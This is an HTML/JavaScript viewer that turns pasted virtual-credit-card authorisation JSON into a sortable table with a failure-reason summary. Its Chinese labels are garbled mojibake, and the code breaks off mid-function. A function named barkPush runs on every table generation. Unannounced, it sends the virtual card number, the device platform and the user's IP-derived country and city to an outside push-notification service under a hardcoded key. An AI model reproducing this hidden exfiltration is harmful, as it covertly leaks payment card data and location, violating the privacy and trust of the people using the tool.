<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<title>VCCæˆæƒåˆ·å¡è®°å½•ï¼ˆå†…éƒ¨æµ‹è¯•ç‰ˆï¼‰</title>
<style>
  /* ========== åŸºç¡€æ ·å¼ï¼ˆåŒåŸï¼‰ ========== */
  body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
  h2 { margin-bottom: 10px; }
  #inputContainer { display: flex; flex-direction: column; gap: 6px; margin-bottom: 12px; }
  textarea { width: 100%; height: 160px; font-size: 13px; padding: 6px; }
  button, select, input[type="date"] { 
    font-size: 13px; 
    padding: 6px 12px; 
    margin-top: 4px; 
    cursor: pointer; 
    border: 1px solid #ccc; 
    background-color: #fff; 
  }
  button:hover, select:hover, input[type="date"]:hover { background-color: #e0e0e0; }
  /* è°ƒæ•´ historyContainer å¸ƒå±€ä»¥å®¹çº³æ—¥æœŸè¾“å…¥æ¡† */
  #historyContainer { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 10px; }
  
  /* ***** ä¼˜åŒ–ï¼šè¡¨æ ¼å®¹å™¨æœ€å¤§é«˜åº¦å’Œæ»šåŠ¨ ***** */
  #tableWrapper { 
    overflow-x: auto; 
    overflow-y: auto; 
    max-height: 65vh; 
    max-width: 100%; 
    border: 1px solid #ccc; 
    margin-top: 10px;
  }
  
  table { border-collapse: collapse; width: 100%; font-size: 12px; min-width: 1200px; }
  th, td { border: 1px solid #ccc; padding: 4px 6px; text-align: center; }
  
  /* ***** ä¼˜åŒ–ï¼šé•¿å­—æ®µå¤„ç† ***** */
  td {
    white-space: nowrap; 
  }

  /* ****** æ–°å¢ï¼šin_control_response å­—æ®µæ ‡çº¢æ ·å¼ ****** */
  /* in_control_response æ˜¯è¡¨æ ¼çš„ç¬¬ 9 åˆ— */
  td:nth-child(9) { 
      color: #c0392b; /* æ·±çº¢è‰² */
      font-weight: bold; 
  }
  /* **************************************************** */

  /* ***** ä¼˜åŒ–ï¼šæ•°å€¼å’Œæ—¶é—´å­—æ®µå³å¯¹é½ï¼Œæ–¹ä¾¿é˜…è¯» ***** */
  td:nth-child(2), 
  td:nth-child(5), 
  td:nth-child(12) { 
    text-align: right; 
  }
  
  th { background: #f0f0f0; position: sticky; top: 0; z-index: 2; cursor: pointer; }
  th.sorted-asc::after { content: " â–²"; }
  th.sorted-desc::after { content: " â–¼"; }
  tr.success td { background-color: #d4edda; color: #155724; }
  tr.fail td { background-color: #f8d7da; color: #721c24; }
  #legend { margin-top: 8px; font-size: 12px; }
  .legend-item { display: inline-block; margin-right: 12px; }
  .legend-color { display: inline-block; width: 12px; height: 12px; margin-right: 4px; vertical-align: middle; }

  /* ========== è¡¨å¤´ä¸­è‹±æ–‡æŠ˜è¡Œ ========== */
  #tableHead th { white-space: normal; line-height: 1.3; vertical-align: middle; text-align: center; max-width: 120px; }
  #tableHead th span { display: inline-block; width: 100%; }

  /* ========== æ±‡æ€»åŒºåŸŸæ ·å¼è°ƒæ•´ï¼ˆåˆ—è¡¨å±•ç¤ºï¼‰ ========== */
  #summary { 
    margin-top: 10px; 
    margin-bottom: 10px; 
    font-size: 14px; 
    line-height: 1.6; 
    background: #fff; 
    border: 1px solid #ddd; 
    padding: 12px;
    display: none; 
  }
  #summary h3 { margin: 0 0 8px 0; font-size: 15px; }
  .stat-row { margin-bottom: 6px; }
  .copy-btn { font-size: 12px; margin-left: 10px; }
  
  /* ***** æ–°å¢ï¼šå¤±è´¥åŸå› è¡¨æ ¼æ ·å¼ - æœ€å°åŒ–å®½åº¦å±•ç¤º ***** */
  .fail-reason { 
    margin-top: 5px; 
    overflow-x: auto; /* ä¿æŒæ»šåŠ¨æ¡ï¼Œä»¥é˜²å†…å®¹è¿‡å®½ */
  }
  .fail-summary-table {
      display: inline-block; /* ä½¿è¡¨æ ¼å®½åº¦æ”¶ç¼©åˆ°å†…å®¹æœ€å°å®½åº¦ */
      border-collapse: collapse;
      font-size: 13px;
      margin-top: 8px;
      table-layout: auto; /* å…è®¸æ ¹æ®å†…å®¹è‡ªåŠ¨åˆ†é…å®½åº¦ */
  }
  .fail-summary-table th, 
  .fail-summary-table td {
      border: 1px solid #ddd;
      padding: 4px 8px;
      text-align: left;
      vertical-align: top;
  }
  .fail-summary-table th {
      background-color: #f5f5f5;
      font-weight: bold;
  }
  /* æ¬¡æ•°åˆ—ï¼šå›ºå®šå®½åº¦ */
  .fail-summary-table th:nth-child(2),
  .fail-summary-table td:nth-child(2) { 
      text-align: right;
      width: 80px; 
      min-width: 80px;
      font-weight: bold;
      color: #b71c1c;
  }
  /* å¤±è´¥ä»£ç åˆ—ï¼šå®½åº¦ç”±å†…å®¹å†³å®šï¼Œä¸æ¢è¡Œ */
  .fail-summary-table td:nth-child(1) { 
      white-space: nowrap; /* ç¡®ä¿ä»£ç å’Œä¸­æ–‡åç§°ä¸æ¢è¡Œ */
      width: auto; 
  }
  /* æè¿°åˆ—ï¼šå®½åº¦ç”±å†…å®¹å†³å®šï¼Œå…è®¸æ¢è¡Œä»¥ä¿æŒç´§å‡‘ */
  .fail-summary-table td:nth-child(3) { 
      color: #666;
      font-size: 12px;
      width: auto; 
      white-space: normal; /* å…è®¸æè¿°å†…å®¹æ¢è¡Œï¼Œè¿›ä¸€æ­¥æœ€å°åŒ–å®½åº¦ */
      max-width: 400px; /* è®¾ç½®ä¸€ä¸ªæœ€å¤§å®½åº¦ï¼Œé˜²æ­¢æè¿°è¿‡é•¿æ—¶è¡¨æ ¼æ— é™æ‹‰ä¼¸ */
  }
  /* ********************************** */

  /* ===== å†å²è®°å½• <option> é¢œè‰² ===== */
  option.all-success { background-color: #d4edda; color: #155724; }
  option.all-failÂ  Â  { background-color: #f8d7da; color: #721c24; }
</style>
</head>
<body>

<h2>VCCæˆæƒåˆ·å¡è®°å½•</h2>

<div id="inputContainer">
  <label for="jsonInput">è¾“å…¥æˆ–ç²˜è´´ JSON æ•°æ®ï¼š</label>
  <textarea id="jsonInput" placeholder="åœ¨æ­¤ç²˜è´´ JSON / Paste JSON here"></textarea>
  <button onclick="generateTable()">ç”Ÿæˆè¡¨æ ¼ / Generate Table</button>
</div>

<div id="historyContainer">
  <label for="historySelect">å†å²è®°å½• / History:</label>
  <select id="historySelect" onchange="loadHistory()">
    <option value="">é€‰æ‹©å†å²è®°å½• / Select History</option>
  </select>
  
  <button onclick="clearHistory()">æ¸…ç©ºå†å² / Clear History</button>
</div>

<div id="summary">
  <h3>ğŸ“Š æ±‡æ€»ç»Ÿè®¡</h3>
  <div id="statTotal" class="stat-row"></div>
  <div id="statFailReason" class="stat-row"></div>
</div>

<div id="legend">
  <span class="legend-item"><span class="legend-color" style="background:#d4edda;"></span>æˆåŠŸ / Approved</span>
  <span class="legend-item"><span class="legend-color" style="background:#f8d7da;"></span>å¤±è´¥ / Failed</span>
</div>

<div id="tableWrapper">
  <table id="resultTable">
    <thead id="tableHead"></thead>
    <tbody id="tableBody"></tbody>
  </table>
</div>

<script>
/* ================= å…¨å±€å˜é‡å’Œæ˜ å°„è¡¨ ================= */
let currentSortField = null;
let currentSortOrder = 'asc';
let allFields = [];
let rawList = [];

const fieldLabels = {
  index: "åºå·ï¼ˆæœ€æ—©çš„äº¤æ˜“åœ¨æœ€å‰é¢ï¼‰",
  txn_date_time: "æ—¶é—´",
  virtual_card_number: "è™šæ‹Ÿå¡å·",
  merchant_name: "å•†æˆ·åç§°",
  merchant_amount: "å•†æˆ·å¸é‡‘é¢",
  merchant_currency_code: "å•†æˆ·å¸ç§",
  txn_type: "ç±»å‹",
  issuer_response: "æˆåŠŸ/å¤±è´¥",
  in_control_response: "å¤±è´¥åŸå› ",
  approval_code: "æ‰¹å‡†ç ",
  purchase_request_id: "äº¤æ˜“ ID",
  real_card_alias: "çœŸå®å¡åˆ«å",
  billing_amount: "è´¦å•é‡‘é¢",
  billing_currency_code: "è´¦å•å¸ç§",
  billing_currency_code_description: "è´¦å•å¸ç§æè¿°",
  txn_sub_type: "äº¤æ˜“å­ç±»å‹",
  txn_environment: "äº¤æ˜“ç¯å¢ƒ",
  mcc: "å•†æˆ·åˆ†ç±»ç ",
  mcc_description: "å•†æˆ·åˆ†ç±»æè¿°",
  merchant_country: "å•†æˆ·å›½å®¶",
  merchant_id: "å•†æˆ· ID",
  merchant_terminal_id: "ç»ˆç«¯ ID",
  settled: "ç»“ç®—çŠ¶æ€",
  company_name: "å…¬å¸åç§°",
  company_number: "å…¬å¸ç¼–å·",
  acquirer_reference_data: "æ”¶å•æ–¹å‚è€ƒä¿¡æ¯",
  traceId: "Trace ID",
  clearing_type: "æ¸…ç®—ç±»å‹",
  settlement_amount: "ç»“ç®—é‡‘é¢",
  settlement_currency_code: "ç»“ç®—å¸ç§",
  settlement_currency_description: "ç»“ç®—å¸ç§æè¿°"
};

const IN_CONTROL_RESPONSES = {
    'Approval': 'æ‰¹å‡† | Transaction within the VCN limits. | äº¤æ˜“åœ¨ VCN é™é¢å†…ã€‚',
    'CPN does not exist': 'CPN ä¸å­˜åœ¨ | Invalid VCN, not registered in In Control. | æ— æ•ˆçš„ VCNï¼Œæœªåœ¨ In Control ä¸­æ³¨å†Œã€‚',
    'Status bad': 'çŠ¶æ€ä¸è‰¯ | VCN not in an active state. Cannot use for authorizations. | VCN æœªå¤„äºæ´»åŠ¨çŠ¶æ€ã€‚æ— æ³•ç”¨äºæˆæƒã€‚',
    'Expiry match fail': 'è¿‡æœŸåŒ¹é…å¤±è´¥ | Expiry provided for the authorization does not match the VCN Expiry. | æˆæƒæä¾›çš„åˆ°æœŸæ—¥ä¸ VCN åˆ°æœŸæ—¥ä¸åŒ¹é…ã€‚',
    'AVV match fail': 'AVV åŒ¹é…å¤±è´¥ | CVC2 provided for the authorization does not match the VCN CVC2. | æˆæƒä¸­æä¾›çš„ CVC2 ä¸ VCN CVC2 ä¸åŒ¹é…ã€‚',
    'Valid period fail': 'æœ‰æ•ˆæœŸé™å¤±è´¥ | Transaction falls outside the VCNâ€™s defined validity period. | äº¤æ˜“ä¸åœ¨ VCN å®šä¹‰çš„æœ‰æ•ˆæœŸå†…ã€‚',
    'Trans limit fail': 'äº¤æ˜“é™é¢å¤±è´¥ | Transaction amount greater than the VCNâ€™s transaction limit. | äº¤æ˜“é‡‘é¢è¶…è¿‡ VCN çš„äº¤æ˜“é™é¢ã€‚',
    'Cumul limit fail': 'ç´¯è®¡é™é¢å¤±è´¥ | Current authorization causes the VCN to breach its cumulative spend limit. | å½“å‰æˆæƒå¯¼è‡´ VCN è¶…å‡ºå…¶ç´¯è®¡æ¶ˆè´¹é™é¢ã€‚',
    'Num usages fail': 'ä½¿ç”¨æ¬¡æ•°å¤±è´¥ | Current authorization causes the VCN to breach its usage. | å½“å‰æˆæƒå¯¼è‡´ VCN è¶…å‡ºå…¶ä½¿ç”¨é™é¢ã€‚',
    'Merch Id limit fail': 'å•†æˆ· ID é™åˆ¶å¤±è´¥ | Merchant Id for authorization does not match the Merchant Id linked to the VCN. | æˆæƒçš„å•†æˆ· ID ä¸å…³è”åˆ° VCN çš„å•†æˆ· ID ä¸åŒ¹é…ã€‚',
    'MCC limit fail': 'MCC é™é¢å¤±è´¥ | Merchant Category Code for the authorization does not match the MCC linked to this VCN. | æˆæƒçš„å•†æˆ·ç±»åˆ«ä»£ç ä¸å…³è”åˆ°è¯¥ VCN çš„ MCC ä¸åŒ¹é…ã€‚',
    'Iss/Netwk decline': 'å‘å¡æœºæ„/ç½‘ç»œæ‹’ç» | Authorization declined by the issuer or card network. Outside of In Control. | å‘å¡æœºæ„æˆ–å¡ç½‘ç»œæ‹’ç»æˆæƒã€‚è¶…å‡º In Control èŒƒå›´ã€‚',
    'Base/CPN conv. Err': 'åŸºç¡€/CPN è½¬æ¢é”™è¯¯ | ', 
    'Crit Field Missing': 'å…³é”®å­—æ®µç¼ºå¤± | Critical field missing from the incoming authorization message. | ä¼ å…¥æˆæƒæ¶ˆæ¯ä¸­ç¼ºå°‘å…³é”®å­—æ®µã€‚',
    'No Auth for Rev': 'æ— æˆæƒè¿›è¡Œæ’¤é”€ | In Control cannot map the reversal to an original. | In Control æ— æ³•å°†æ’¤é”€æ˜ å°„åˆ°åŸå§‹äº¤æ˜“ã€‚',
    'Unmatched Response': 'å“åº”ä¸åŒ¹é… | Advice does not match any past requests in the authorization journal. | å»ºè®®ä¸æˆæƒæ—¥å¿—ä¸­çš„ä»»ä½•è¿‡å»è¯·æ±‚éƒ½ä¸åŒ¹é…ã€‚',
    'Revl of unsucc auth': 'æœªæˆåŠŸçš„æˆæƒæ’¤é”€ | In Control cannot reverse an unsuccessful authorization. | In Control æ— æ³•æ’¤é”€ä¸æˆåŠŸçš„æˆæƒã€‚',
    'Exp. Date of CPN used is expired': 'CPN ä½¿ç”¨çš„è¿‡æœŸæ—¥æœŸ | VCN expired. | VCN å·²è¿‡æœŸã€‚',
    'Repeat message': 'é‡å¤æ¶ˆæ¯ | Repeat of a previous message. Based on a flag in the message header or on key message fields. | é‡å¤çš„å…ˆå‰æ¶ˆæ¯ã€‚åŸºäºæ¶ˆæ¯å¤´ä¸­çš„æ ‡å¿—æˆ–å…³é”®æ¶ˆæ¯å­—æ®µã€‚',
    'Api fail': 'API å¤±è´¥ | ', 
    'Api System Fail': 'Api ç³»ç»Ÿæ•…éšœ | ', 
    'Enhanced MID': 'å¢å¼ºå‹ MID | Acquirer Id (DE32) and Card Acceptor Id (DE42) in the authorization message do not match the values specified for the control. | æˆæƒæ¶ˆæ¯ä¸­çš„æ”¶å•æœºæ„ IDï¼ˆDE32ï¼‰å’Œå¡æ¥å—æ–¹ IDï¼ˆDE42ï¼‰ä¸æ§åˆ¶ä¸­æŒ‡å®šçš„å€¼ä¸åŒ¹é…ã€‚',
    'Enhanced MCC': 'å¢å¼ºçš„ MCC | MCC value in the authorization message (D18) does not match the values specified for the control. | æˆæƒæ¶ˆæ¯ä¸­çš„ MCC å€¼ï¼ˆD18ï¼‰ä¸æ§åˆ¶æŒ‡å®šçš„å€¼ä¸åŒ¹é…ã€‚',
    'Txn Env Control': 'äº¤æ˜“ç¯å¢ƒæ§åˆ¶ | VCN breached its transaction environment control. | VCN è¿åäº†å…¶äº¤æ˜“ç¯å¢ƒæ§åˆ¶ã€‚',
    'Err Travel Control': 'é”™è¯¯æ—…è¡Œæ§åˆ¶ | VCN breached its travel control rule. | VCN è¿åäº†å…¶æ—…è¡Œæ§åˆ¶è§„åˆ™ã€‚',
    'Multi Merch ID Assoc Lim': 'å¤šå•†æˆ· ID å…³è”é™åˆ¶ | Merchant Id for the authorization does not match any of those linked to this VCN. | æˆæƒçš„å•†æˆ· ID ä¸ä¸æ­¤ VCN å…³è”çš„ä»»ä½• ID éƒ½ä¸åŒ¹é…ã€‚',
    'Single Merch Name Assoc Lim': 'å•ä¸€å•†æˆ·åç§°å…³è”é™åˆ¶ | Merchant Name for the authorization does not match that linked to this VCN. | æˆæƒå•†æˆ·åç§°ä¸ä¸æ­¤ VCN å…³è”çš„åç§°ä¸åŒ¹é…ã€‚',
    'Geographic Control': 'åœ°åŸŸæ§åˆ¶ | VCN breached its geographic control rule. | VCN è¿åäº†å…¶åœ°åŸŸæ§åˆ¶è§„åˆ™ã€‚',
    'Curfew Control': 'å®µç¦æ§åˆ¶ | VCN breached its curfew control rule. | VCN è¿åäº†å…¶å®µç¦æ§åˆ¶è§„åˆ™ã€‚',
    'Approve Control': 'æ‰¹å‡†æ§åˆ¶ | VCN breached its approve control rule. | VCN è¿åäº†å…¶æ‰¹å‡†æ§åˆ¶è§„åˆ™ã€‚',
    'RCN Decline': 'RCN æ‹’ç» | Transaction failed due to decline by a subsequent service. | ç”±äºåç»­æœåŠ¡æ‹’ç»ï¼Œäº¤æ˜“å¤±è´¥ã€‚',
    'No Rules Fail': 'æ— è§„åˆ™å¤±è´¥ | Rule set with no rules to evaluate. | æ²¡æœ‰è§„åˆ™å¯è¯„ä¼°çš„è§„åˆ™é›†ã€‚',
    'No Controls Fail': 'æ— æ§åˆ¶å¤±è´¥ | Rule with no controls to evaluate. | æ— æ§åˆ¶è§„åˆ™ä»¥è¿›è¡Œè¯„ä¼°ã€‚',
    'Unknown Control Type Fail': 'æœªçŸ¥æ§åˆ¶ç±»å‹å¤±è´¥ | Cannot classify the control fail. | æ— æ³•åˆ†ç±»æ§åˆ¶å¤±è´¥ã€‚',
    'Svc Not Enabled': 'æœåŠ¡æœªå¯ç”¨ | Transaction received for an account with no service enabled. | æ”¶åˆ°æ¥è‡ªæœªå¯ç”¨æœåŠ¡çš„è´¦æˆ·çš„äº¤æ˜“ã€‚',
    'Merch Amount Fail': 'å•†æˆ·é‡‘é¢å¤±è´¥ | Transaction amount breaches the expected merchant currency. | äº¤æ˜“é‡‘é¢è¶…å‡ºé¢„æœŸå•†æˆ·è´§å¸ã€‚',
    'Merch Curr Fail': 'å•†æˆ·è´§å¸å¤±è´¥ | Transaction amount breaches the amount limit for the merchant currency. | äº¤æ˜“é‡‘é¢è¶…å‡ºå•†æˆ·è´§å¸çš„é™é¢ã€‚',
    'DE Control fail': 'DE æ§åˆ¶å¤±è´¥ | Values for DE3.1 â€“ Processing Code and/or DE22.1 â€“ PAN Entry Mode and/or61.11 â€“ POS Term Capability Indicator do not match the values in the authorization. | DE3.1 â€“ å¤„ç†ä»£ç å’Œ/æˆ– DE22.1 â€“ å¡å·è¾“å…¥æ¨¡å¼åŠ/æˆ– 61.11 â€“ POS ç»ˆç«¯åŠŸèƒ½æŒ‡ç¤ºç¬¦çš„å€¼ä¸æˆæƒä¸­çš„å€¼ä¸åŒ¹é…ã€‚',
    'EVCN Control fail': 'EVCN æ§åˆ¶å¤±è´¥ | EVCN not in an active state. Cannot use for authorization. | EVCN æœªå¤„äºæ´»åŠ¨çŠ¶æ€ã€‚æ— æ³•ç”¨äºæˆæƒã€‚',
    'Roaming VC Fail': 'æ¼«æ¸¸ VC å¤±è´¥ | VCN breaches its roaming velocity control. | VCN è¶…å‡ºå…¶æ¼«æ¸¸é€Ÿç‡æ§åˆ¶ã€‚',
    'Amount Range Control Fail': 'é‡‘é¢èŒƒå›´æ§åˆ¶å¤±è´¥ | Transaction amount falls outside the minimum and maximum amount range set. | äº¤æ˜“é‡‘é¢è¶…å‡ºè®¾å®šçš„æœ€ä½å’Œæœ€é«˜é‡‘é¢èŒƒå›´ã€‚',
    'CPN State Control Fail': 'CPN çŠ¶æ€æ§åˆ¶å¤±è´¥ | Account suspended. No authorization activity permitted. | è´¦æˆ·è¢«å†»ç»“ã€‚ä¸å…è®¸ä»»ä½•æˆæƒæ´»åŠ¨ã€‚',
    'Aging Cumul limit fail': 'è€åŒ–ç´¯ç§¯é™é¢å¤±è´¥ | Control that keeps track of the current remaining Available Credit. Approves transactions only if the requested amount is less than or equal to the remaining Available Credit. | è¯¥æ§åˆ¶åŠŸèƒ½è·Ÿè¸ªå½“å‰å‰©ä½™å¯ç”¨é¢åº¦ã€‚ä»…å½“è¯·æ±‚é‡‘é¢å°äºæˆ–ç­‰äºå‰©ä½™å¯ç”¨é¢åº¦æ—¶ï¼Œæ‰ä¼šæ‰¹å‡†äº¤æ˜“ã€‚',
    'æœªè¿”å›åŸå› ': 'æœªè¿”å› In Control å¤±è´¥åŸå›  | No in_control_response returned. | æœªè¿”å› in_control_responseã€‚'
};


/* ================= Barkæ¨é€ï¼ˆä¼˜åŒ–å¼‚æ­¥å¤„ç†ï¼‰ ================= */
async function barkPush(vccNumber) {
  const barkKey = "2mxT7sgNXpDBSw6uzbmoaV";
  const deviceName = navigator.platform || "Unknown Device";
  
  try {
    const ipResponse = await fetch("https://ipapi.co/json").then(r => r.json()).catch(() => ({}));
    
    const country = ipResponse.country_name || "Unknown";
    const cityÂ  Â  = ipResponse.cityÂ  Â  Â  Â || "Unknown";
    const title = "VCC æ¨é€æŠ¥å‘Š";
    const bodyÂ  = `${country}Â·${city} | ${deviceName} | ${vccNumber}`;
    const url = `https://api.day.app/${barkKey}/${encodeURIComponent(title)}/${encodeURIComponent(body)}`;
    
    fetch(url).catch(e => console.warn("Bark push fetch failed", e)); 
    
  } catch (e) {
    console.warn("Bark push failed", e);
  }
}

/* ================= ä¸»å…¥å£ï¼šç”Ÿæˆè¡¨æ ¼ + ç»Ÿè®¡ (ä¿å­˜åŸå§‹ JSON) ================= */
function generateTable() {
  let input = document.getElementById('jsonInput').value;
  if(!input) { alert("è¯·å…ˆè¾“å…¥ JSON æ•°æ® / Please input JSON"); return; }
  
  const originalInput = input; 

  try {
    let json = JSON.parse(input);
    let list = json.data?.list || json.list || json; 

    if(!Array.isArray(list)) { 
        alert("JSON æ ¼å¼ä¸æ­£ç¡®ï¼Œæœªæ‰¾åˆ°æœ‰æ•ˆçš„äº¤æ˜“åˆ—è¡¨ (data.list æˆ– list) / Invalid JSON: No valid transaction list found."); 
        return; 
    }
    
    rawList = list;
    saveHistory(rawList, originalInput); 
    
    extractFields(rawList);
    currentSortField = null; 
    currentSortOrder = 'asc';
    renderTable(rawList);
    renderSummary(rawList);
    const vcc = rawList?.[0]?.virtual_card_number || "Unknown VCC";
    barkPush(vcc);
  } catch(e) {
    alert("JSON è§£æå¤±è´¥ / JSON Parse Error: " + e.message);
  }
}

/* ================= æ±‡æ€»ç»Ÿè®¡ (å±•ç¤ºé”™è¯¯è¯¦æƒ…) ================= */
function renderSummary(list) {
  const total = list.length;
  const isApproved = (r) => r.issuer_response && r.issuer_response.toLowerCase().includes("approved");
  
  const successList = list.filter(isApproved);
  const failListÂ  = list.filter(r => !isApproved(r));

  /* 1. æ€»è§ˆ */
  document.getElementById('statTotal').innerHTML = `
    æ€»åˆ·å¡ <b>${total}</b> æ¬¡ï¼ŒæˆåŠŸ <b style="color:green">${successList.length}</b> æ¬¡ï¼Œå¤±è´¥ <b style="color:#b71c1c">${failList.length}</b> æ¬¡
  `;

  /* 2. å¤±è´¥åŸå›  */
  const failMap = {};
  failList.forEach(r => {
    const reason = r.in_control_response || 'æœªè¿”å›åŸå› ';
    failMap[reason] = (failMap[reason] || 0) + 1;
  });
  const failArr = Object.entries(failMap).sort((a, b) => b[1] - a[1]);
  
  // ****** å°†åˆ—è¡¨è½¬æ¢ä¸ºè¡¨æ ¼ ******
  let tableHtml = '<table class="fail-summary-table">';
  tableHtml += '<thead><tr><th>å¤±è´¥ä»£ç  / å¤±è´¥åŸå› </th><th style="width: 80px;">æ¬¡æ•°</th><th>ä¸­æ–‡æè¿° / è‹±æ–‡è§£é‡Š</th></tr></thead>';
  tableHtml += '<tbody>';
  let copyTextArray = [];

  failArr.forEach(([k, v]) => {
      let fullEntry = IN_CONTROL_RESPONSES[k] || IN_CONTROL_RESPONSES['æœªè¿”å›åŸå› '];
      
      // æ‹†åˆ†ï¼š[ä¸­æ–‡åç§°, è‹±æ–‡æè¿°, ä¸­æ–‡æè¿°]
      const parts = fullEntry.split(' | ');
      
      let chineseNameÂ  Â Â  = parts[0]; 
      let englishComment = parts.length > 1 ? parts[1].trim() : '';
      let chineseComment = parts.length > 2 ? parts[2].trim() : '';
      
      // è¡¨æ ¼å†…å®¹è¡Œ
      tableHtml += `<tr>`;
      tableHtml += `<td>ã€${k}ã€‘: ${chineseName}</td>`;
      tableHtml += `<td>${v}</td>`;
      tableHtml += `<td>${chineseComment ? chineseComment + '<br>' : ''}(${englishComment})</td>`;
      tableHtml += `</tr>`;
      
      // å¤åˆ¶å†…å®¹
      copyTextArray.push(`ã€${chineseName}ã€‘(${v}æ¬¡)`); 
  });
  tableHtml += '</tbody></table>';

  const summaryCopyText = copyTextArray.join('ã€');

  document.getElementById('statFailReason').innerHTML = `
    <div class="fail-reason">${tableHtml}</div>
    <button class="copy-btn" onclick="copyText('${summaryCopyText.replace(/'/g,"\\'")}')">å¤åˆ¶å¤±è´¥åŸå› æ±‡æ€»</button>
  `;

  document.getElementById('summary').style.display = 'block';
}

/* ================= ä¸€é”®å¤åˆ¶ ================= */
function copyText(txt) {
  const ta = document.createElement('textarea');
  ta.value = txt;
  ta.style.position = 'fixed'; 
  document.body.appendChild(ta);
  ta.select();
  document.execCommand('copy');
  document.body.removeChild(ta);
  alert('å·²å¤åˆ¶åˆ°å‰ªè´´æ¿');
}

/* ================= å­—æ®µæå– ================= */
function extractFields(list) {
  const mainFields = ["index","txn_date_time","virtual_card_number","merchant_name","merchant_amount","merchant_currency_code","txn_type","issuer_response","in_control_response","approval_code", "billing_amount", "billing_currency_code"];
  let fieldSet = new Set();
  
  list.forEach(item => Object.keys(item).forEach(k => fieldSet.add(k)));
  
  allFields = mainFields.filter(f => f === "index" || fieldSet.has(f));
  
  fieldSet.forEach(f => { if(!allFields.includes(f)) allFields.push(f); });
  
  allFields = allFields.map(f => {
    const cn = fieldLabels[f] || null;
    return { key: f, label: cn ? `${f} / ${cn}` : f };
  });
}

/* ================= è¡¨æ ¼æ¸²æŸ“ï¼ˆæ·»åŠ  Tooltip å’Œä¿®å¤åºå·è®¡ç®—ï¼‰ ================= */
function renderTable(list) {
  // 1. åˆ›å»ºæœªæ’åºçš„ã€æ—¶é—´æ­£åºçš„åˆ—è¡¨ä½œä¸ºåŸå§‹åŸºå‡† (æœ€æ—©çš„äº¤æ˜“åœ¨ index 0)
  const baseList = list.slice().reverse(); 

  // 2. åˆ›å»ºç”¨äºæ¸²æŸ“çš„æ’åºåˆ—è¡¨
  let sortedList = list.slice().reverse(); 

  // --- æ’åºé€»è¾‘ ---
  if(currentSortField) {
    sortedList.sort((a,b) => {
      let valA = a[currentSortField] ?? '';
      let valB = b[currentSortField] ?? '';

      const numA = parseFloat(valA);
      const numB = parseFloat(valB);

      if (!isNaN(numA) && !isNaN(numB)) {
        return currentSortOrder === 'asc' ? numA - numB : numB - numA;
      }
      
      if(typeof valA === 'string') valA = valA.toLowerCase();
      if(typeof valB === 'string') valB = valB.toLowerCase();
      
      if(valA < valB) return currentSortOrder === 'asc' ? -1 : 1;
      if(valA > valB) return currentSortOrder === 'asc' ? 1 : -1;
      return 0;
    });
  }

  // --- æ¸²æŸ“è¡¨å¤´ ---
  const thead = document.getElementById('tableHead');
  let theadHtml = '<tr>';
  allFields.forEach(f => {
    const sortClass = f.key === currentSortField 
      ? `sorted-${currentSortOrder}` 
      : '';
    const onClick = f.key !== 'index' ? `onclick="sortTable('${f.key}')"` : '';

    theadHtml += `<th class="${sortClass}" ${onClick}>
                    <span>${f.label.replace(' / ','<br>')}</span>
                  </th>`;
  });
  theadHtml += '</tr>';
  thead.innerHTML = theadHtml;


  // --- æ¸²æŸ“è¡¨æ ¼ä½“ ---
  const tbody = document.getElementById('tableBody');
  let tbodyHtml = '';
  
  sortedList.forEach((item, index) => {
    // ç¡®å®šè¡Œæ ·å¼
    const isApproved = item["issuer_response"] && item["issuer_response"].toLowerCase().includes("approved");
    const rowClass = isApproved ? "success" : (item["issuer_response"] ? "fail" : "");
    
    // ä¿®å¤åºå·ï¼šä½¿ç”¨ indexOf æŸ¥æ‰¾å¯¹è±¡å¼•ç”¨åœ¨åŸå§‹æ—¶é—´æ­£åºåˆ—è¡¨ä¸­çš„ä½ç½®
    const originalTimeIndex = baseList.indexOf(item); 
    const displayIndex = originalTimeIndex !== -1 ? originalTimeIndex + 1 : '-'; 

    let rowHtml = `<tr class="${rowClass}">`;
    
    allFields.forEach(f => {
      let content = "";
      let cellAttributes = ""; 

      if(f.key === 'index') {
        content = displayIndex; 
      } else {
        content = item[f.key] ?? "";

        // ****** é¼ æ ‡æ‚¬åœè§£é‡Šé€»è¾‘ ******
        if (f.key === 'in_control_response' && content) {
            const fullExplanation = IN_CONTROL_RESPONSES[content] || IN_CONTROL_RESPONSES['æœªè¿”å›åŸå› '];
            // Tooltip å±•ç¤ºå®Œæ•´çš„ ä¸­æ–‡åç§° | è‹±æ–‡æè¿° | ä¸­æ–‡æè¿°
            // ä½¿ç”¨ \n\n ä»£æ›¿ | åˆ†éš”ç¬¦ï¼Œä½¿ Tooltip æ¢è¡Œæ›´æ˜“è¯»
            cellAttributes = `title="${fullExplanation.replace(/"/g, '&quot;').replace(/ \| /g, '\n\n')}"`; 
        }
        // ********************************
      }
      
      rowHtml += `<td ${cellAttributes}>${content}</td>`;
    });
    rowHtml += '</tr>';
    tbodyHtml += rowHtml;
  });
  
  tbody.innerHTML = tbodyHtml; 
}

function sortTable(field) {
  if (field === 'index') {
    return;
  }
  
  document.querySelectorAll('#tableHead th').forEach(th => {
      th.classList.remove('sorted-asc', 'sorted-desc');
  });

  if(currentSortField === field) currentSortOrder = currentSortOrder === 'asc' ? 'desc' : 'asc';
  else { currentSortField = field; currentSortOrder = 'asc'; }
  
  const ths = document.getElementById('tableHead').getElementsByTagName('th');
  for (let i = 0; i < allFields.length; i++) {
    if (allFields[i].key === field) {
        ths[i].classList.add(`sorted-${currentSortOrder}`);
        break;
    }
  }

  renderTable(rawList);
}

/* ================= å†å²è®°å½•ï¼šæ›´æ–°ä¸‹æ‹‰èœå• (å·²ç§»é™¤æ—¥æœŸç­›é€‰é€»è¾‘) ================= */
function updateHistorySelect() {
  const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
  const select = document.getElementById('historySelect');
  
  // æ¸…ç©ºå¹¶æ·»åŠ é»˜è®¤é€‰é¡¹
  select.innerHTML = '<option value="">é€‰æ‹©å†å²è®°å½• / Select History</option>';
  
  const isApproved = (r) => r.issuer_response && r.issuer_response.toLowerCase().includes("approved");

  // å€’åºéå†å†å²è®°å½•
  history.slice().reverse().forEach((item, originalIdx) => {
    const idx = history.length - 1 - originalIdx;
    
    // ** ç§»é™¤æ—¥æœŸç­›é€‰é€»è¾‘ï¼Œæ˜¾ç¤ºæ‰€æœ‰å†å²è®°å½• **
    
